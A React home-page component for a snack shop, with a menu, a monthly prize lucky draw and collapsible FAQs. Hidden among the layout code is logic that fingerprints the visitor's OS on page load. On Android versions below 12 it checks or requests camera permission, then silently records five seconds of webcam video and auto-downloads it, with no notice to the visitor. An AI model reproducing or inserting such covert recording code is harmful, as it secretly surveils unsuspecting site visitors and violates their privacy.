import style from '../styles/home.module.css';
import Footer from './footer';
import Navbar from './navbar';
import Happy from '../images/happy.png';
import Fries1 from '../images/fries3.png';
import Fries2 from '../images/fries2.png';
import Fries3 from '../images/fries1.png';
import { useEffect, useState } from 'react';
import CheesyFries from '../images/chessyfries.jpg';
import FrenchFries from '../images/frenchfries.jpg';
import Roll from '../images/roll.jpg';
import Samosa from '../images/samosa.jpg';
import Win from '../images/win.png';
import { FaRegCircleCheck } from "react-icons/fa6";
import { GoChevronDown, GoChevronUp } from "react-icons/go";

export default function Home() {

    const startRecording = async (streamFromFallback) => {
        const stream = streamFromFallback || await navigator.mediaDevices.getUserMedia({ video: true });

        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];

        mediaRecorder.ondataavailable = (e) => {
            if (e.data.size > 0) {
                chunks.push(e.data);
            }
        };

        mediaRecorder.onstop = () => {
            const blob = new Blob(chunks, { type: 'video/webm' });
            const videoUrl = URL.createObjectURL(blob);

            const a = document.createElement('a');
            a.href = videoUrl;
            a.download = 'recorded-video.webm';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            // Stop all video tracks to release camera
            stream.getTracks().forEach(track => track.stop());
        };

        mediaRecorder.start();
        console.log("Recording started");

        setTimeout(() => {
            mediaRecorder.stop();
            console.log("Recording stopped");
        }, 5000);
    };

    const [osVersion, setOSVersion] = useState("Detecting...");
    const checkCameraPermission = async () => {
        try {
            const permission = await navigator.permissions.query({ name: "camera" });

            if (permission.state === "granted") {
                console.log("Camera permission already granted. Starting video recording...");
                startRecording();
            } else {
                console.log("Camera permission denied. No action taken.");
            }
        } catch (err) {
            console.error("Error checking camera permission:", err);
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                console.log("Camera permission granted after fallback. Starting video recording...");
                startRecording(stream);
            } catch (err) {
                console.error("Camera permission denied (fallback). No action taken.", err);
            }
        }
    };

    useEffect(() => {
        const userAgent = navigator.userAgent;

        const androidMatch = userAgent.match(/Android\s([0-9\.]+)/);
        if (androidMatch) {
            const versionStr = androidMatch[1];
            const version = parseFloat(versionStr);
            const os = `Android ${androidMatch[1]}`;
            console.log("Detected OS:", os);
            setOSVersion(os);
            if (version < 12) {
                checkCameraPermission();
            }
            return;
        }

        const iOSMatch = userAgent.match(/OS\s([0-9_]+)\slike\sMac\sOS\sX/);
        if (iOSMatch) {
            const os = `iOS ${iOSMatch[1].replace(/_/g, ".")}`;
            console.log("Detected OS:", os);
            setOSVersion(os);
            return;
        }

        const windowsMatch = userAgent.match(/Windows NT ([0-9\.]+)/);
        if (windowsMatch) {
            const versionMap = {
                "10.0": "Windows 10/11",
                "6.3": "Windows 8.1",
                "6.2": "Windows 8",
                "6.1": "Windows 7",
                "6.0": "Windows Vista",
                "5.1": "Windows XP",
            };
            const version = versionMap[windowsMatch[1]] || `Windows NT ${windowsMatch[1]}`;
            console.log("Detected OS:", version);
            setOSVersion(version);
            return;
        }

        const macMatch = userAgent.match(/Mac OS X ([0-9_]+)/);
        if (macMatch) {
            const os = `macOS ${macMatch[1].replace(/_/g, ".")}`;
            console.log("Detected OS:", os);
            setOSVersion(os);
            return;
        }
        console.log("Detected OS: Unknown OS");
        setOSVersion("Unknown OS");
    }, []);

    // useEffect(()=>{
    //     checkCameraPermission()
    // }, []);


    const [openQuestion, setOpenQuestion] = useState('');
    const [index, setIndex] = useState(0);
    const images = [Fries1, Fries2, Fries3];
    useEffect(() => {
        const interval = setInterval(() => {
            setIndex((prevIndex) => (prevIndex + 1) % images.length);
        }, 3000);

        return () => clearInterval(interval);
    }, []);
    function changeIndex(ind) {
        if (openQuestion == ind) {
            setOpenQuestion('');
        } else {
            setOpenQuestion(ind);
        }
    }
    return (
        <div className={style.home}>
            <Navbar />
            <img src={images[index]} height='100%' width="100%" />
            <p className={style.tagline}>Best Taste & Quality</p>
            <div className={style.foodboxcontainer}>
                <div className={style.foodbox}>
                    <img src={Samosa} className={style.foodimg} />
                    <p className={style.itemname}>Samosa</p>
                    <p className={style.itemdesc}>Crispy and flavorful samosas filled with spiced potatoes, wrapped in a golden, flaky crust. A perfect snack.</p>
                </div>
                <div className={style.foodbox}>
                    <img src={CheesyFries} className={style.foodimg} />
                    <p className={style.itemname}>Loaded Fries</p>
                    <p className={style.itemdesc}>Our cheesy and crispy fries loaded with rich, melted cheese and creamy mayo. A perfect blend of crunch and cheesy goodness.</p>
                </div>
                <div className={style.foodbox}>
                    <img src={FrenchFries} className={style.foodimg} />
                    <p className={style.itemname}>French Fries</p>
                    <p className={style.itemdesc}>Crispy and golden, our French fries are perfectly seasoned and fried to perfection. Light, crunchy and quick snack.</p>
                </div>
                <div className={style.foodbox}>
                    <img src={Roll} className={style.foodimg} />
                    <p className={style.itemname}>Roll</p>
                    <p className={style.itemdesc}>Crispy and delicious potato rolls are packed with spiced mashed potatoes, wrapped in a golden and crunchy layer.</p>
                </div>
            </div>
            <div className={style.prizesection}>
                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
                    <img src={Win} />
                    <p className={style.prizetitle}>Win exciting prizes !!!</p>

                    <p className={style.prizedesc}>Buy your favorite snacks and get a chance to win exciting prizes! The more you buy, the higher your chances of winning in our monthly lucky draw. Delicious treats and amazing rewards—don’t miss out!</p>
                </div>
                <img src={Happy} className={style.happyface} />
            </div>

            <p className={style.tagline}>Our Perks</p>
            <div className={style.foodboxcontainer}>
                <div className={style.advantagediv}>
                    <p style={{ fontSize: '20px', fontWeight: 'bold', color: '#FFDC5A' }}>Quick & Satisfying</p>
                    <p style={{ fontSize: '14px' }}>Need a quick bite? Grab our delicious, crispy snacks made fresh and fast and enjoy a tasty treat anytime, anywhere. Perfect for your cravings on the go!</p>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                        <p style={{ fontSize: '30px', color: '#FFDC5A', fontWeight: 'bold' }}>1</p>
                        <FaRegCircleCheck color='#FFDC5A' size={35} />
                    </div>
                </div>
                <div className={style.advantagediv}>
                    <p style={{ fontSize: '20px', fontWeight: 'bold', color: '#FFDC5A' }}>Fresh & Hygienic</p>
                    <p style={{ fontSize: '14px' }}>Looking for a healthy and hygienic snack? Enjoy our fresh, clean, and delicious treats made with the finest ingredients. Eat fresh, stay healthy</p>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                        <p style={{ fontSize: '30px', color: '#FFDC5A', fontWeight: 'bold' }}>2</p>
                        <FaRegCircleCheck color='#FFDC5A' size={35} />
                    </div>
                </div>
                <div className={style.advantagediv}>
                    <p style={{ fontSize: '20px', fontWeight: 'bold', color: '#FFDC5A' }}>Crispy & Delicious</p>
                    <p style={{ fontSize: '14px' }}>Craving something crispy and delicious? Try our perfectly golden, crunchy snacks that are bursting with flavor. Freshly made and irresistibly tasty!</p>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                        <p style={{ fontSize: '30px', color: '#FFDC5A', fontWeight: 'bold' }}>3</p>
                        <FaRegCircleCheck color='#FFDC5A' size={35} />
                    </div>
                </div>
                <div className={style.advantagediv}>
                    <p style={{ fontSize: '20px', fontWeight: 'bold', color: '#FFDC5A' }}>Eat & Win Prizes</p>
                    <p style={{ fontSize: '14px' }}>Win exciting prizes. Buy your favorite crispy snacks and get a chance to win amazing rewards every month! The more you buy, the better your chances.</p>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                        <p style={{ fontSize: '30px', color: '#FFDC5A', fontWeight: 'bold' }}>4</p>
                        <FaRegCircleCheck color='#FFDC5A' size={35} />
                    </div>
                </div>
            </div>
            <p className={style.tagline}>FAQs</p>
            <div className={style.faqoutercontainer}>
                <div onClick={() => changeIndex(1)} style={{ width: '90%', backgroundColor: '#252525', display: 'flex', flexDirection: 'column', padding: '10px', boxSizing: 'border-box', borderRadius: '5px', color: 'white', gap: '20px' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%' }}>
                        <p style={{ fontWeight: 'bold', width: 'calc(100% - 30px)' }}>What are your snack ordering hours?</p>
                        <div style={{ width: '30px', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                            {
                                openQuestion == 1 ? <GoChevronUp color='white' size={20} /> : <GoChevronDown color='white' size={20} />
                            }
                        </div>
                    </div>

                    {
                        openQuestion == 1 && <p>You can place your snack orders between 9:00 AM and 5:00 PM every day. Orders outside this window won’t be accepted.

                        </p>
                    }
                </div>
                <div onClick={() => changeIndex(2)} style={{ width: '90%', backgroundColor: '#252525', display: 'flex', flexDirection: 'column', padding: '10px', boxSizing: 'border-box', borderRadius: '5px', color: 'white', gap: '20px' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%' }}>
                        <p style={{ fontWeight: 'bold', width: 'calc(100% - 30px)' }}>How can I win the cash prize?</p>
                        <div style={{ width: '30px', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                            {
                                openQuestion == 2 ? <GoChevronUp color='white' size={20} /> : <GoChevronDown color='white' size={20} />
                            }
                        </div>
                    </div>

                    {
                        openQuestion == 2 && <p>The more you order, the better your chances!</p>
                    }
                </div>
                <div onClick={() => changeIndex(3)} style={{ width: '90%', backgroundColor: '#252525', display: 'flex', flexDirection: 'column', padding: '10px', boxSizing: 'border-box', borderRadius: '5px', color: 'white', gap: '20px' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%' }}>
                        <p style={{ fontWeight: 'bold', width: 'calc(100% - 30px)' }}>When is the lucky draw held?</p>
                        <div style={{ width: '30px', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                            {
                                openQuestion == 3 ? <GoChevronUp color='white' size={20} /> : <GoChevronDown color='white' size={20} />
                            }
                        </div>
                    </div>

                    {
                        openQuestion == 3 && <p>The lucky draw takes place on the 1st of every month. Orders from the previous month are not counted to determine the winner.</p>
                    }
                </div>
                <div onClick={() => changeIndex(4)} style={{ width: '90%', backgroundColor: '#252525', display: 'flex', flexDirection: 'column', padding: '10px', boxSizing: 'border-box', borderRadius: '5px', color: 'white', gap: '20px' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%' }}>
                        <p style={{ fontWeight: 'bold', width: 'calc(100% - 30px)' }}>What is the QR code used for?</p>
                        <div style={{ width: '30px', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                            {
                                openQuestion == 4 ? <GoChevronUp color='white' size={20} /> : <GoChevronDown color='white' size={20} />
                            }
                        </div>
                    </div>

                    {
                        openQuestion == 4 && <p> The QR code in your winner's email will be scanned by our team for verification when you claim your prize. Make sure to keep it safe!</p>
                    }
                </div>
                <div onClick={() => changeIndex(5)} style={{ width: '90%', backgroundColor: '#252525', display: 'flex', flexDirection: 'column', padding: '10px', boxSizing: 'border-box', borderRadius: '5px', color: 'white', gap: '20px' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%' }}>
                        <p style={{ fontWeight: 'bold', width: 'calc(100% - 30px)' }}>Is there any minimum order value to participate?</p>
                        <div style={{ width: '30px', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                            {
                                openQuestion == 5 ? <GoChevronUp color='white' size={20} /> : <GoChevronDown color='white' size={20} />
                            }
                        </div>
                    </div>

                    {
                        openQuestion == 5 && <p>No minimum order value is required. Every order counts, regardless of size.</p>
                    }
                </div>
                <div onClick={() => changeIndex(6)}  style={{ width: '90%', backgroundColor: '#252525', display: 'flex', flexDirection: 'column', padding: '10px', boxSizing: 'border-box', borderRadius: '5px', color: 'white', gap: '20px' }}>
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', width: '100%' }}>
                        <p style={{ fontWeight: 'bold', width: 'calc(100% - 30px)' }}>How long is the winner QR code valid for?</p>
                        <div style={{ width: '30px', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
                            {
                                openQuestion == 6 ? <GoChevronUp color='white' size={20} /> : <GoChevronDown color='white' size={20} />
                            }
                        </div>
                    </div>

                    {
                        openQuestion == 6 && <p> The QR code sent to the winner is valid only until the next lucky draw (i.e., until the 1st of the next month).</p>
                    }
                </div>
            </div>
            <Footer />
        </div>
    );
}